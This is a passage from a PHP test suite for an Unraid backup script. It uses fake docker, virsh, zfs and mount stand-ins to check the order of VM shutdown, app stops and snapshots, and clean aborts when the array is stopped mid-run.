            [$t, $what] = explode(' ', $l, 2) + [1 => ''];
            $out[] = [(int) $t, preg_replace('/^zfs snapshot .*/', 'zfs snapshot', $what)];
        }
        return $out;
    };
    $at = function (array $ev, string $what, bool $last = false): ?int {
        $found = null;
        foreach ($ev as $i => [, $w]) {
            if ($w === $what) {
                $found = $i;
                if (!$last) {
                    break;
                }
            }
        }
        return $found;
    };
    $run = fn (string $args = '') => (string) shell_exec('bash -c ' . escapeshellarg("$env; bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . " $args </dev/null") . ' 2>&1');
    $log = fn () => (string) @file_get_contents("$data/logs/latest.log");
    $status = fn () => json_decode((string) @file_get_contents("$data/state/status.json"), true) ?: [];

    // --- a night with a VM that shuts down, one that ignores it, one that goes off late, one paused
    $settings(['vmshut' => 'shutdown', 'vmdeaf' => 'shutdown', 'vmlate' => 'shutdown', 'vmpause' => 'pause']);
    $night(['vmshut' => 'obey', 'vmdeaf' => 'deaf', 'vmlate' => 'late', 'vmpause' => 'obey']);
    $out = $run();
    $ev = $events();
    $s = $status();
    $l = $log();
    $names = array_column($ev, 1);
    $stop = $at($ev, 'docker stop c1');
    $snap = $at($ev, 'zfs snapshot');
    check('vm order: the run went through', in_array($s['result'] ?? '', ['ok', 'warnings'], true) && $stop !== null && $snap !== null, $out . $l);
    check('vm order: every shutdown request (and the repeated one) before the first app stops',
        $stop !== null && $at($ev, 'virsh shutdown vmdeaf', true) < $stop && $at($ev, 'virsh shutdown vmshut') < $stop && $at($ev, 'virsh shutdown vmlate', true) < $stop
        && count(array_keys($names, 'virsh shutdown vmdeaf', true)) >= 2, json_encode($names));
    check('vm order: the apps stop only once the deadline passed — they never waited for a VM',
        $stop !== null && $ev[$stop][0] - $ev[$at($ev, 'virsh shutdown vmshut')][0] >= 4, json_encode($ev));
    $start = $at($ev, 'docker start c1');
    check('vm order: downtime_s is the apps\' stop only (from their stop to their start, not the VMs\' wait)',
        $start !== null && $stop !== null && ($s['downtime_s'] ?? -1) >= 0 && ($s['downtime_s'] ?? 99) <= $ev[$start][0] - $ev[$stop][0] + 1 && ($s['downtime_s'] ?? 99) < 4,
        json_encode([$s['downtime_s'] ?? null, $ev]));
    check('vm order: the VM that ignored its shutdown and the one to pause are paused after the apps, right before the snapshot',
        $stop !== null && $snap !== null && $stop < $at($ev, 'virsh suspend vmdeaf') && $at($ev, 'virsh suspend vmdeaf') < $snap
        && $stop < $at($ev, 'virsh suspend vmpause') && $at($ev, 'virsh suspend vmpause') < $snap, json_encode($names));
    check('vm order: the one off late is not paused, nor the one shut down', !in_array('virsh suspend vmlate', $names, true) && !in_array('virsh suspend vmshut', $names, true), json_encode($names));
    check('vm order: after the snapshot all are back, before the apps start',
        $snap !== null && $start !== null && $snap < $at($ev, 'virsh start vmshut') && $at($ev, 'virsh start vmshut') < $start
        && $snap < $at($ev, 'virsh start vmlate') && $snap < $at($ev, 'virsh resume vmdeaf') && $snap < $at($ev, 'virsh resume vmpause'), json_encode($names));
    $byVm = array_column($s['vms'] ?? [], null, 'name');
    same('vm order: status.json vms — what was done with each',
        [['shutdown', 'shutdown'], ['shutdown', 'paused'], ['shutdown', 'shutdown'], ['pause', 'paused']],
        array_map(fn ($v) => [$byVm[$v]['prepare'] ?? null, $byVm[$v]['done'] ?? null], ['vmshut', 'vmdeaf', 'vmlate', 'vmpause']));
    check('vm order: seconds held — a shutdown from its request, the ignored one from its pause',
        ($byVm['vmshut']['seconds'] ?? 0) >= 4 && ($byVm['vmdeaf']['seconds'] ?? 99) < 4, json_encode($s['vms'] ?? null));
    $pos = fn (string $needle) => ($p = strpos($l, $needle)) === false ? null : $p;
    $order = [$pos('VMs: shutting down 3 before anything stops'), $pos("VM 'vmshut': shut down"), $pos("WARNING: VM 'vmdeaf' did not shut down within 4 s"),
              $pos('Nextcloud ...'), $pos('Pausing apps: 1'), $pos("VM 'vmdeaf': paused"), $pos("VM 'vmlate': shut down (after its deadline)"), $pos('Creating snapshots')];
    $sorted = $order;
    sort($sorted);
    check('vm order: the log tells it in that order', !in_array(null, $order, true) && $order === $sorted, json_encode($order) . "\n" . $l);
    check('vm order: nothing left in state/vms', !file_exists("$data/state/vms"));

    // --- a night without a VM to shut down: no wait, no line, the same order as before
    $settings(['vmpause' => 'pause']);
    $night(['vmpause' => 'obey']);
    $run();
    $ev = $events();
    $names = array_column($ev, 1);
    $l = $log();
    check('vm order: no VM to shut down — no request, no line, the apps stop and the VM is paused before the snapshot',
        !preg_grep('/^virsh shutdown/', $names) && !str_contains($l, 'shutting down') && $at($ev, 'docker stop c1') !== null
        && $at($ev, 'docker stop c1') < $at($ev, 'virsh suspend vmpause') && $at($ev, 'virsh suspend vmpause') < $at($ev, 'zfs snapshot'), json_encode($names) . $l);

    // --- stopped while a VM goes down: the run waits until it is off and starts it again; nothing else was stopped
    $settings(['vmslow' => 'shutdown']);
    $night(['vmslow' => 'slow']);
    $p = proc_open(['bash', '-c', "$env; exec bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . ' </dev/null >/dev/null 2>&1'], [], $pipes);
    $pid = proc_get_status($p)['pid'];
    for ($i = 0; $i < 150 && !str_contains((string) @file_get_contents("$fake/events"), 'virsh shutdown vmslow'); $i++) {
        usleep(100000);
    }
    $phase = $status()['phase'] ?? '';
    posix_kill($pid, SIGTERM);
    for ($i = 0; $i < 150 && proc_get_status($p)['running']; $i++) {
        usleep(100000);
    }
    proc_close($p);
    $ev = $events();
    $names = array_column($ev, 1);
    $s = $status();
    $l = $log();
    same('vm order: stopped in the VMs\' shutdown — the phase', 'vm_shutdown', $phase);
    check('vm order: stopped while it goes down — waited for it, started again, no app stopped',
        $names === ['virsh shutdown vmslow', 'virsh start vmslow'] && str_contains($l, 'Waiting for 1 VM(s) going down'), json_encode($names) . $l);
    same('vm order: stopped — aborted, no downtime, nothing noted', ['aborted', 0, false], [$s['result'] ?? null, $s['downtime_s'] ?? null, file_exists("$data/state/vms")]);

    // --- killed while it goes down (kill -9): state/vms names it; the next start starts it once it is off
    $night(['vmslow' => 'slow']);
    file_put_contents("$data/state/vms", "vmslow|shutdown\n");
    file_put_contents("$fake/vm/vmslow.state", "shut off\n");
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    shell_exec('bash -c ' . escapeshellarg("$env; source $lib >/dev/null 2>&1; LOG_FILE=$tmp/recover.log; recover_interrupted_run") . ' 2>&1');
    same('vm order: killed — the next start starts it again', [['virsh start vmslow'], false], [array_column($events(), 1), file_exists("$data/state/vms")]);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Engine 2.24: the run notices the array being stopped (var.ini fsState Stopping) and ends at once, cleanly.
 * backup.sh on a fixture server like testBackupVmOrder, with Kopia: stand-ins for docker (the containers c1,
 * a Nextcloud nc and kopia — `docker exec kopia kopia snapshot create` is a perl process that answers SIGINT,
 * listed by `docker top` with its pid), zfs (snapshots kept in a file, destroy noted), virsh, mount/umount
 * (the mounts file), notify; UB_VAR_INI a fake var.ini the stand-ins flip to Stopping at a chosen moment.
 * A normal run first (the fixture works: Kopia, maintenance mode, VMs, pruning), then the stop during the
 * Kopia phase, between pausing the apps and the snapshots, at Nextcloud's maintenance mode and at the run's
 * start; then the first run after the array start; then the office reading such a run.
 * Engine 2.25 on the same fixture: the Kopia order (small and important first, by expected size) in a real run,
 * and backup.sh --recover - nothing noted, the array being stopped, the lock busy, what a stopped run left
 * brought back right after the array start, Docker silent, a run waiting for a recover instead of skipping.
 */
function testBackupArrayStop(): void
{
    if (posix_getuid() !== 0) {
        check('array stop: backup.sh runs as root only — not run here', true);
        return;
    }
    if (trim((string) shell_exec('command -v perl 2>/dev/null')) === '') {
        check('array stop: perl is missing here (the Kopia stand-in) — not run', true);
        return;
    }
    $tmp = sys_get_temp_dir() . '/office-tests-arraystop-' . getmypid();
    exec('rm -rf ' . escapeshellarg($tmp));
    $mnt = "$tmp/mnt";
    $pool = "$mnt/master";
    $fake = "$tmp/fake";
    $data = "$tmp/data/unraid-backup";
    $root = "$mnt/addons/UnraidSecretaryOffice/snapshots";
    foreach (["$tmp/bin", "$fake/vm", "$fake/ct", "$data/state", "$tmp/boot/config/shares", "$mnt/user", "$pool/appdata/c1", "$pool/appdata/nc", "$pool/appdata/kopia",
              "$pool/docs/papers", "$pool/UnraidSecretaryOffice/backup", "$pool/domains/vmshut", "$pool/domains/vmpause", "$tmp/stage"] as $d) {
        @mkdir($d, 0700, true);
    }
    touch("$pool/domains/vmshut/vdisk1.img");
    touch("$pool/domains/vmpause/vdisk1.img");
    foreach (['appdata', 'docs', 'domains', 'UnraidSecretaryOffice'] as $n) {
        touch("$tmp/boot/config/shares/$n.cfg");
    }
    $mounts0 = "master $pool zfs rw 0 0\nmaster/appdata $pool/appdata zfs rw 0 0\nmaster/docs $pool/docs zfs rw 0 0\nmaster/domains $pool/domains zfs rw 0 0\n"
        . "master/UnraidSecretaryOffice $pool/UnraidSecretaryOffice zfs rw 0 0\nshfs $mnt/user fuse.shfs rw 0 0\n";
    $z = fn ($n, $mp) => "$n\t$mp\ton\t" . crc32($n) . "\t1000\t-\n";
    file_put_contents("$fake/zfs.txt", $z('master', $pool) . $z('master/appdata', "$pool/appdata") . $z('master/docs', "$pool/docs") . $z('master/domains', "$pool/domains")
        . $z('master/UnraidSecretaryOffice', "$pool/UnraidSecretaryOffice"));
    $ct = fn ($name, $img, $binds) => ['Name' => "/$name", 'Id' => "id-$name", 'Config' => ['Image' => $img, 'Env' => [], 'Labels' => new stdClass()],
        'State' => ['Running' => true], 'HostConfig' => ['NetworkMode' => 'bridge'],
        'Mounts' => array_map(fn ($b) => ['Type' => 'bind', 'Source' => $b[0], 'Destination' => $b[1], 'RW' => true], $binds)];
    file_put_contents("$fake/inspect.json", json_encode([$ct('c1', 'nginx', [["$mnt/user/appdata/c1", '/config']]), $ct('nc', 'nextcloud', [["$mnt/user/appdata/nc", '/var/www/html']]),
        $ct('kopia', 'imagegenius/kopia', [["$mnt/user/appdata/kopia", '/config'], [$root, '/uso']])]));
    file_put_contents("$fake/repo.json", json_encode(['configFile' => '/config/repository.config', 'storage' => ['type' => 'filesystem'], 'clientOptions' => ['username' => 'root', 'hostname' => 'kopia']]));
    // the stand-ins note what changes something: "<time> <what>"; $FAKE/stop-at names the moment the array stop begins
    $flip = 'flip() { [[ "$(cat "$FAKE/stop-at" 2>/dev/null)" == "$1" ]] || return 0; echo \'fsState="Stopping"\' >"$FAKE/var.ini"; ev "array stopping"; }';
    file_put_contents("$tmp/bin/docker", <<<SH
#!/bin/bash
ev() { echo "\$(date +%s) \$*" >>"\$FAKE/events"; }
$flip
st() { cat "\$FAKE/ct/\$1" 2>/dev/null || echo running; }
case "\$1" in
  info|version) [[ -e "\$FAKE/docker.down" ]] && exit 1; exit 0 ;;
  ps) printf 'id-c1\\nid-nc\\nid-kopia\\n'; exit 0 ;;
  compose) exit 1 ;;
  top)
    if [[ "\$4" == pid,uid,args ]]; then printf 'PID UID COMMAND\\n7 0 /app/kopia server start\\n'; exit 0; fi
    echo 'PID COMMAND'; echo '7 /app/kopia server start'; cat "\$FAKE/kopia.top" 2>/dev/null; exit 0 ;;
  inspect)
    shift
    if [[ "\$1" == -f ]]; then
      case "\$2" in
        *Mounts*) printf '%s\\x1e/uso\\x1efalse\\x1erslave\\n' "\$FAKE_ROOT" ;;
        *Health*) [[ "\$(st "\$3")" == running ]] && echo "true " || echo "false " ;;
        *State.Running*) [[ "\$(st "\$3")" == running ]] && echo true || echo false ;;
      esac
      exit 0
    fi
    [[ "\$1" == --format ]] && { echo "/c1  nginx  sha256:1"; exit 0; }
    cat "\$FAKE/inspect.json"; exit 0 ;;
  stop) shift; while [[ "\$1" == -* ]]; do shift 2; done
        for c in "\$@"; do echo stopped >"\$FAKE/ct/\$c"; ev "docker stop \$c"; done; flip docker-stop; exit 0 ;;
  start) shift; for c in "\$@"; do echo running >"\$FAKE/ct/\$c"; ev "docker start \$c"; done; exit 0 ;;
  exec)
    shift
    while [[ "\$1" == -* ]]; do case "\$1" in -u|-e) shift 2 ;; *) shift ;; esac; done
    c="\$1"; shift
    [[ "\$(st "\$c")" == running ]] || { echo "Error response from daemon: container \$c is not running" >&2; exit 1; }
    if [[ "\$c" == nc ]]; then
      case "\$1" in
        test) exit 0 ;;
        stat) echo www-data; exit 0 ;;
        php)
          shift 2
          case "\$*" in
            "config:system:get instanceid") echo inst1 ;;
            "config:system:get maintenance") cat "\$FAKE/nc.maint" 2>/dev/null || echo false ;;
            "maintenance:mode --on") echo true >"\$FAKE/nc.maint"; ev "occ maintenance on"; flip maintenance ;;
            "maintenance:mode --off") echo false >"\$FAKE/nc.maint"; ev "occ maintenance off" ;;
            status) ;;
            *) exit 1 ;;
          esac
          exit 0 ;;
      esac
      exit 1
    fi
    [[ "\$c" == kopia ]] || exit 1
    case "\$1" in
      cat) [[ "\$2" == /proc/self/mountinfo ]] || exit 1
           while read -r s t f o r; do [[ "\$t" == "\$FAKE_ROOT"/* ]] && echo "36 25 0:50 / /uso\${t#"\$FAKE_ROOT"} ro,relatime - \$f \$s ro"; done <"\$FAKE/mounts"; exit 0 ;;
      kopia)
        shift; [[ "\$1" == --no-progress ]] && shift
        case "\$1 \${2:-}" in
          "repository status") cat "\$FAKE/repo.json" ;;
          "policy list") echo '[]' ;;
          "snapshot list") cat "\$FAKE/snaplist.json" 2>/dev/null || echo '[]' ;;
          "snapshot create")
            cp="\$3"; n=\$(( \$(cat "\$FAKE/kopia.n" 2>/dev/null || echo 0) + 1 )); echo "\$n" >"\$FAKE/kopia.n"
            ev "kopia start \$cp"
            echo "\$\$ kopia --no-progress snapshot create \$cp --description x" >"\$FAKE/kopia.top"
            flip "kopia:\$n"
            # an upload: a moment - or, once the array is being stopped, until SIGINT (Kopia saves a checkpoint and ends)
            exec perl -e '\$cp = shift; \$f = shift; \$long = shift;
              sub ev { open(my \$h, ">>", "\$f/events"); print \$h time() . " \$_[0]\\n"; close(\$h); }
              \$SIG{INT} = sub { ev("kopia interrupted \$cp"); unlink("\$f/kopia.top"); exit 0; };
              select(undef, undef, undef, 0.1) for 1 .. (\$long ? 300 : 3);
              ev("kopia done \$cp"); unlink("\$f/kopia.top"); exit 0;' "\$cp" "\$FAKE" "\$(grep -c Stopping "\$FAKE/var.ini")" ;;
          --version*) echo "0.23.0 build" ;;
        esac
        exit 0 ;;
    esac
    exit 1 ;;
esac
exit 1
SH);
    file_put_contents("$tmp/bin/virsh", <<<SH
#!/bin/bash
ev() { echo "\$(date +%s) \$*" >>"\$FAKE/events"; }
$flip
V="\$FAKE/vm"; n="\${2:-}"
[[ "\$2" == --* ]] && n="\${@: -1}"
state() { cat "\$V/\$n.state" 2>/dev/null || echo running; }
case "\$1" in
  list) cat "\$FAKE/vms"; exit 0 ;;
  domstate) state; exit 0 ;;
  dominfo) echo "Autostart:      disable"; exit 0 ;;
  dumpxml) echo "<domain><name>\$n</name><uuid>uuid-\$n</uuid></domain>"; exit 0 ;;
  domblklist) printf 'Type Device Target Source\\n----\\nfile disk vdisk1 %s\\n' "\$MNT/user/domains/\$n/vdisk1.img"; exit 0 ;;
  qemu-agent-command|domfsfreeze) exit 1 ;;
  shutdown) ev "virsh shutdown \$n"; echo "shut off" >"\$V/\$n.state"; exit 0 ;;
  suspend) [[ "\$(state)" == running ]] || exit 1; echo paused >"\$V/\$n.state"; ev "virsh suspend \$n"; flip suspend; exit 0 ;;
  resume) echo running >"\$V/\$n.state"; ev "virsh resume \$n"; exit 0 ;;
  start) [[ "\$(state)" == "shut off" ]] || exit 1; echo running >"\$V/\$n.state"; ev "virsh start \$n"; exit 0 ;;
esac
exit 0
SH);
    // zfs: datasets from zfs.txt, snapshots kept in snaps.txt (made, listed, destroyed)
    file_put_contents("$tmp/bin/zfs", <<<'SH'
#!/bin/bash
ev() { echo "$(date +%s) $*" >>"$FAKE/events"; }
case "$1" in
  list) if [[ "$*" == *'-t snapshot'* ]]; then
          if [[ "$*" == *'-d 1'* ]]; then grep "^${@: -1}@" "$FAKE/snaps.txt"; else cat "$FAKE/snaps.txt"; fi
        elif [[ "$*" == *'-t filesystem'* ]]; then cat "$FAKE/zfs.txt"; fi
        exit 0 ;;
  snapshot) shift; printf '%s\n' "$@" >>"$FAKE/snaps.txt"; ev "zfs snapshot"; exit 0 ;;
  destroy) grep -vxF -- "$2" "$FAKE/snaps.txt" >"$FAKE/snaps.new"; mv "$FAKE/snaps.new" "$FAKE/snaps.txt"; ev "zfs destroy $2"
           [[ "$(cat "$FAKE/stop-at" 2>/dev/null)" == destroy ]] && { echo 'fsState="Stopping"' >"$FAKE/var.ini"; ev "array stopping"; }
           exit 0 ;;
esac
exit 0
SH);
    // mount/umount: what is mounted goes into (and out of) the mounts file the engine reads
    file_put_contents("$tmp/bin/mount", <<<'SH'
#!/bin/bash
case "$*" in *--make-private*|*remount*) exit 0 ;; esac
t="${@: -1}"; s="${@: -2:1}"; mkdir -p "$t"
[[ "$*" == *--bind* ]] && exit 0
echo "$s $t fake ro 0 0" >>"$FAKE/mounts"
SH);
    file_put_contents("$tmp/bin/umount", "#!/bin/bash\nawk -v t=\"\${@: -1}\" '\$2 != t' \"\$FAKE/mounts\" >\"\$FAKE/mounts.new\" && mv \"\$FAKE/mounts.new\" \"\$FAKE/mounts\"\n");
    foreach (['zpool', 'btrfs'] as $b) {
        file_put_contents("$tmp/bin/$b", "#!/bin/bash\nexit 0\n");
    }
    file_put_contents("$tmp/bin/mountpoint", "#!/bin/bash\n[[ \"\${@: -1}\" == */user ]]\n");
    // one line per notification (the long text's line breaks as " | ")
    file_put_contents("$tmp/bin/notify", <<<'SH'
#!/bin/bash
a="$*"; printf '%s\n' "${a//$'\n'/ | }" >>"$FAKE/notify.log"
SH);
    foreach (glob("$tmp/bin/*") as $f) {
        chmod($f, 0755);
    }
    $env = "export PATH=$tmp/bin:\$PATH UB_DATA=$data UB_MNT=$mnt UB_BOOT=$tmp/boot UB_SHARES_CFG=$tmp/boot/config/shares UB_STAGE=$tmp/stage"
         . " UB_DISKS_INI=$fake/disks.ini UB_MOUNTS_FILE=$fake/mounts UB_NOTIFY_BIN=$tmp/bin/notify UB_VAR_INI=$fake/var.ini FAKE=$fake FAKE_ROOT=$root MNT=$mnt"
         . ' UB_VM_SHUTDOWN_TIMEOUT=4 UB_VM_SHUTDOWN_RETRY=2 UB_ARRAY_LOOK=1 UB_NC_SETTLE=0';
    file_put_contents("$data/settings.ini", "[general]\nserver = Test\nmount_root = $root\nview_root = $mnt/addons/UnraidSecretaryOffice/btrfs-snap\n"
        . "snap_prefix = uso-backup-\ndumps_share = UnraidSecretaryOffice\nmin_free_gb = 0\n[zfs]\nretention = 1 0 0\n[docker]\nstop = all\nknown = c1\nknown = nc\nknown = kopia\n"
        . "[flash]\nmode = off\n[libvirt]\nmode = off\n[kopia]\nenabled = yes\ncontainer = kopia\nidentity = root@kopia\n[nextcloud \"nc\"]\npreexisting_maintenance = abort\n"
        . "[share \"appdata\"]\nmode = kopia\n[share \"docs\"]\nmode = kopia\n[share \"UnraidSecretaryOffice\"]\nmode = kopia\n[share \"domains\"]\nmode = snapshot\n"
        . "[vm \"vmshut\"]\nmode = snapshot\nprepare = shutdown\n[vm \"vmpause\"]\nmode = snapshot\nprepare = pause\n");
    // a fresh night: everything running, the array started, two old snapshots the retention lets go, nothing noted
    $night = function (string $stopAt = '') use ($fake, $data, $mounts0): void {
        exec('rm -rf ' . escapeshellarg("$fake/vm") . ' ' . escapeshellarg("$fake/ct") . ' ' . escapeshellarg("$data/logs"));
        foreach (['events', 'notify.log', 'kopia.n', 'kopia.top', 'nc.maint', 'stop-at'] as $f) {
            @unlink("$fake/$f");
        }
        foreach (['status.json', 'stopped', 'maintenance', 'vms'] as $f) {
            @unlink("$data/state/$f");
        }
        @mkdir("$fake/vm", 0700, true);
        @mkdir("$fake/ct", 0700, true);
        file_put_contents("$fake/vms", "vmshut\nvmpause\n");
        file_put_contents("$fake/mounts", $mounts0);
        file_put_contents("$fake/snaps.txt", "master/appdata@uso-backup-20200101-0100\nmaster/appdata@uso-backup-20200102-0100\n");
        file_put_contents("$fake/var.ini", "mdState=\"STARTED\"\nfsState=\"Started\"\n");
        if ($stopAt !== '') {
            file_put_contents("$fake/stop-at", $stopAt);
        }
    };
    $run = function (string $args = '') use ($env): array {
        $t0 = microtime(true);
        $out = (string) shell_exec('bash -c ' . escapeshellarg("$env; bash " . escapeshellarg(OFFICE_DIR . '/backup/backup.sh') . " $args </dev/null; echo \"exit=\$?\"") . ' 2>&1');
        preg_match('/exit=(\d+)\s*$/', $out, $m);
        return [(int) ($m[1] ?? -1), microtime(true) - $t0, $out];
    };
    $events = function () use ($fake): array {
        $out = [];
        foreach (@file("$fake/events", FILE_IGNORE_NEW_LINES) ?: [] as $l) {
            [$t, $what] = explode(' ', $l, 2) + [1 => ''];
            $out[] = [(int) $t, $what];
        }
        return $out;
    };
    $names = fn () => array_column($events(), 1);
    $status = fn () => json_decode((string) @file_get_contents("$data/state/status.json"), true) ?: [];
    $log = fn () => (string) @file_get_contents("$data/logs/latest.log");
    $notes = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents("$fake/notify.log"))));
    $lockFree = function () use ($data): bool {
        exec('flock -n ' . escapeshellarg("$data/state/lock") . ' true', $o, $rc);
        return $rc === 0;
    };
    $ours = fn () => array_values(array_filter(file("$fake/mounts", FILE_IGNORE_NEW_LINES) ?: [], fn ($l) => str_contains($l, " $root/")));
    $lastHistory = fn () => json_decode((string) (array_slice(@file("$data/state/history.jsonl", FILE_IGNORE_NEW_LINES) ?: [], -1)[0] ?? ''), true) ?: [];

    // --- a normal night: the fixture works (Kopia for every share, maintenance mode on and off, VMs, pruning)
    $night();
    [$code, , $out] = $run();
    $s = $status();
    $n = $names();
    $plan = $s['kopia']['planned'] ?? [];
    check('array stop: a normal run first — it went through, Kopia for every share', in_array($s['result'] ?? '', ['ok', 'warnings'], true) && $code === 0 && count($plan) === 3
        && count(array_filter($s['kopia']['done'] ?? [], fn ($d) => $d['ok'])) === 3 && ($s['kopia']['skipped'] ?? null) === []
        && array_key_exists('interrupted', $s['kopia'] ?? []) && $s['kopia']['interrupted'] === null, $out . $log());
    check('array stop: a normal run — maintenance on and off, the VMs held and back, the old snapshots pruned',
        in_array('occ maintenance on', $n, true) && in_array('occ maintenance off', $n, true) && in_array('virsh start vmshut', $n, true) && in_array('virsh resume vmpause', $n, true)
        && in_array('zfs destroy master/appdata@uso-backup-20200101-0100', $n, true), json_encode($n));
    check('array stop: a normal run — its mounts gone, no array-stop notification', $ours() === [] && !preg_grep('/array stop/', $notes()), json_encode([$ours(), $notes()]));

    $prunedRuns = fn () => count(json_decode((string) @file_get_contents("$data/state/pruned.json"), true)['runs'] ?? []);
    $pruned0 = $prunedRuns();

    // --- the array stop begins while Kopia uploads the second source
    $night('kopia:2');
    [$code, $took, $out] = $run();
    $s = $status();
    $ev = $events();
    $n = array_column($ev, 1);
    $flipAt = null;
    foreach ($ev as [$t, $w]) {
        if ($w === 'array stopping') {
            $flipAt = $t;
        }
    }
    $second = $plan[1] ?? '?';
    same('array stop in Kopia: aborted, array_stopping, exit code 3', ['aborted', 'array_stopping', 3], [$s['result'] ?? null, $s['message'] ?? null, $code]);
    $done = array_map(fn ($d) => [$d['name'], $d['ok']], $s['kopia']['done'] ?? []);
    same('array stop in Kopia: the first source done, the one going on interrupted, it and the rest skipped — none failed',
        [[[$plan[0] ?? '?', true]], $second, array_slice($plan, 1)], [$done, $s['kopia']['interrupted'] ?? null, $s['kopia']['skipped'] ?? null]);
    check('array stop in Kopia: the upload was interrupted inside the container (SIGINT to the kopia process), the third never started',
        count(preg_grep('/^kopia interrupted /', $n)) === 1 && count(preg_grep('/^kopia start /', $n)) === 2, json_encode($n));
    check('array stop in Kopia: nothing pruned', !preg_grep('/^zfs destroy/', $n), json_encode($n));
    check('array stop in Kopia: ended within seconds of the stop', $flipAt !== null && (int) ($s['finished'] ?? 0) - $flipAt <= 5, json_encode([$flipAt, $s['finished'] ?? null, $took]));
    check('array stop in Kopia: lock free, its note gone, its mounts gone', $lockFree() && !is_file("$data/state/lock-holder.json") && $ours() === [], json_encode($ours()));
    same('array stop in Kopia: no errors counted', 0, $s['errors'] ?? null);
    $nt = $notes();
    check('array stop in Kopia: one notification, normal, saying the next run continues the upload', count($nt) === 1 && str_contains($nt[0], '-i normal')
        && str_contains($nt[0], 'Backup stopped for the array stop') && str_contains($nt[0], 'the next run continues the Kopia upload'), json_encode($nt));
    $h = $lastHistory();
    same('array stop in Kopia: a history line like any run', ['aborted', 'array_stopping', array_slice($plan, 1)], [$h['result'] ?? null, $h['message'] ?? null, $h['kopia']['skipped'] ?? null]);
    same('array stop in Kopia: no entry in pruned.json (it never reached its retention)', $pruned0, $prunedRuns());
    $abortedLine = (string) (array_slice(file("$data/state/history.jsonl", FILE_IGNORE_NEW_LINES), -1)[0] ?? '');

    // --- between pausing the apps and the snapshots (the VM to pause is just paused)
    $night('suspend');
    [$code, , $out] = $run();
    $s = $status();
    $n = $names();
    same('array stop before the snapshots: aborted, array_stopping', ['aborted', 'array_stopping', 3], [$s['result'] ?? null, $s['message'] ?? null, $code]);
    check('array stop before the snapshots: no snapshot, nothing pruned, Kopia never started', !in_array('zfs snapshot', $n, true) && !preg_grep('/^(zfs destroy|kopia start)/', $n), json_encode($n));
    check('array stop before the snapshots: nothing started — the stopped containers and the VM shut down stay so',
        !preg_grep('/^(docker start|virsh start)/', $n) && in_array('docker stop c1', $n, true) && in_array('virsh shutdown vmshut', $n, true), json_encode($n));
    check('array stop before the snapshots: the paused VM resumed (a held guest can\'t shut down)', in_array('virsh resume vmpause', $n, true), json_encode($n));
    same('array stop before the snapshots: noted for the next run — the containers, Nextcloud\'s maintenance mode (its container is stopped), the VM shut down',
        [['c1', 'nc'], ['nc'], ['vmshut|shutdown']],
        [array_values(array_filter(array_map('trim', @file("$data/state/stopped") ?: []))), array_values(array_filter(array_map('trim', @file("$data/state/maintenance") ?: []))),
         array_values(array_filter(array_map('trim', @file("$data/state/vms") ?: [])))]);
    same('array stop before the snapshots: every Kopia source skipped', $plan, $s['kopia']['skipped'] ?? null);
    $nt = $notes();
    check('array stop before the snapshots: one normal notification naming what stays for the next run', count($nt) === 1 && str_contains($nt[0], '-i normal')
        && str_contains($nt[0], 'the next run backs up as usual') && str_contains($nt[0], 'VM vmshut, c1, nc, maintenance mode of nc'), json_encode($nt));
    check('array stop before the snapshots: lock free', $lockFree() && !is_file("$data/state/lock-holder.json"));

    // --- the first run after the array start: it brings back what the stopped run left (and backs up)
    file_put_contents("$fake/var.ini", "fsState=\"Started\"\n");
    @unlink("$fake/stop-at");
    @unlink("$fake/events");
    @unlink("$fake/notify.log");
    [$code, , $out] = $run();
    $n = $names();
    $s = $status();
    check('array stop, the next run: starts the containers and the VM again, Nextcloud out of maintenance mode, then backs up',
        array_slice($n, 0, 4) === ['docker start c1', 'docker start nc', 'occ maintenance off', 'virsh start vmshut']
        && in_array($s['result'] ?? '', ['ok', 'warnings'], true) && !is_file("$data/state/stopped") && !is_file("$data/state/vms"), json_encode($n) . $log());
    $rep = array_values(preg_grep('/Aborted run repaired/', $notes()));
    check('array stop, the next run: «Aborted run repaired» is a normal notification (engine 2.25 - expected after an array stop), no warning counted',
        count($rep) === 1 && str_contains($rep[0], '-i normal') && !str_contains($log(), 'WARNING: The run the array stop ended'), json_encode($notes()));

    // --- at Nextcloud's maintenance mode: its container still runs - the mode goes off at once, nothing stopped
    $night('maintenance');
    [$code, , $out] = $run();
    $s = $status();
    $n = $names();
    same('array stop at the maintenance mode: aborted, array_stopping', ['aborted', 'array_stopping'], [$s['result'] ?? null, $s['message'] ?? null]);
    check('array stop at the maintenance mode: switched off again, no container stopped, nothing noted',
        in_array('occ maintenance off', $n, true) && !preg_grep('/^docker stop/', $n) && !is_file("$data/state/maintenance") && !is_file("$data/state/stopped"), json_encode($n));

    // --- in the middle of the retention: what it destroyed until then goes into pruned.json, the rest waits
    $night('destroy');
    file_put_contents("$fake/snaps.txt", "master/appdata@uso-backup-20200101-0100\nmaster/docs@uso-backup-20200101-0100\n");
    $before = $prunedRuns();
    [$code] = $run();
    $s = $status();
    $pr = json_decode((string) @file_get_contents("$data/state/pruned.json"), true)['runs'] ?? [];
    $nt = $notes();
    same('array stop while pruning: aborted, the first dataset\'s snapshot gone and noted in pruned.json, the second dataset left',
        ['aborted', 'array_stopping', $before + 1, ['master/appdata@uso-backup-20200101-0100'], false],
        [$s['result'] ?? null, $s['message'] ?? null, count($pr), end($pr)['zfs'] ?? null, in_array('zfs destroy master/docs@uso-backup-20200101-0100', $names(), true)]);
    check('array stop while pruning: the notification says so', count($nt) === 1 && str_contains($nt[0], 'retention had removed 1 snapshot(s)'), json_encode($nt));

    // --- already stopping when the run starts: it touches nothing - an earlier run's notes stay for after the array start
    $night();
    file_put_contents("$fake/var.ini", "fsState=\"Stopping\"\n");
    file_put_contents("$data/state/stopped", "c1\n");
    file_put_contents("$fake/ct/c1", "stopped\n");
    [$code, $took, $out] = $run();
    $s = $status();
    same('array stop at the start: aborted, array_stopping, nothing done, the earlier note kept',
        ['aborted', 'array_stopping', 3, [], "c1\n"], [$s['result'] ?? null, $s['message'] ?? null, $code, $names(), (string) @file_get_contents("$data/state/stopped")]);
    same('array stop at the start: Kopia not judged (not checked yet)', '', $s['kopia']['state'] ?? null);
    check('array stop at the start: quick, lock free', $took < 10 && $lockFree(), (string) $took);
    // a check while the array is being stopped: ended the same way, no notification (started by hand)
    @unlink("$fake/notify.log");
    [$code] = $run('--check');
